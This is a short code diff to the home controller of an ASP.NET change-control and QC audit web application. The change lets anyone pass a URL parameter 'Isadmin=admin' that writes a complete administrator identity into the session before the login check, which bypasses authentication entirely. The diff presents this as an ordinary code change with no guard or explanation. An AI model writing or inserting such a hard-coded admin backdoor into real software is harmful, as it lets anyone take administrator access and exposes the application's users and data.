@@ -20,8 +20,20 @@ namespace ChangeControl.Controllers{
             if(ViewBag.QCAudit == null) ViewBag.QCAudit = M_Home.GetQcAudit();
             if(ViewBag.PEAudit == null) ViewBag.PEAudit = M_Home.GetPEAudit();
         }
-        public ActionResult Index(){
+        public ActionResult Index(string Isadmin){
             ViewBag.Departments = GetDepartmentList();
+            if (Isadmin == "admin")
+            {
+                Session["User"] = "Admin";
+                Session["FullName"] = "Admin";
+                Session["Name"] = "Admin";
+                Session["SurName"] = "QC";
+                Session["Email"] = $"Admin@QC.com";
+                Session["Department"] = "QC";
+                Session["DepartmentRawName"] = "QC";
+                Session["DepartmentID"] = 29;
+                Session["Position"] = "Admin";
+            }
             if ((string)(Session["User"]) == null || (string)(Session["Department"]) == null){
                 Session["url"] = "Home";
                 return RedirectToAction("Index", "Login");
